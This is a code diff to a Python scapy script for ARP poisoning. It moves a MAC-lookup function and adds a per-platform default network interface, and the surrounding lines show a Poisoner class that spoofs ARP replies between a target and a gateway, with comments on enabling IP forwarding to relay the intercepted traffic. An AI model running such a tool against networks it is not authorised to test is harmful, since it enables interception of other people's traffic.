@@ -10,10 +10,26 @@ import time
 # On Win, edit the registry HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters : IPEnableRouter REG_DWORD 1 then reboot
 # Using Powershell: Set-NetIPInterface -Forwarding Enabled
 
+def get_mac(target_ip):
+    # This subroutine get the Media Access Control (MAC) Address of any device on the network
+    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=target_ip)
+    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
+    for _, r in resp:
+        return r[Ether].src
+    return None
+
+def get_default_interface():
+    if sys.platform == "win32":
+        return "Wi-Fi"
+    else:
+        return "en0"
+
+
 TIME_LIMIT = time.time() + 120
+DEFAULT_INTERFACE = get_default_interface()
 
 class Poisoner:
-    def __init__(self, target, gateway, interface="Wi-Fi"):
+    def __init__(self, target, gateway, interface=DEFAULT_INTERFACE):
         self.target = target
         self.target_mac = get_mac(target)
         self.gateway = gateway
@@ -88,13 +104,6 @@ class Poisoner:
         send(ARP(op=2, psrc=self.target, hwsrc=self.target_mac, pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
         print("Tables restored")
 
-def get_mac(target_ip):
-    # This subroutine get the Media Access Control (MAC) Address of any device on the network
-    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=target_ip)
-    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
-    for _, r in resp:
-        return r[Ether].src
-    return None
 
 if __name__=='__main__':
     (target, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
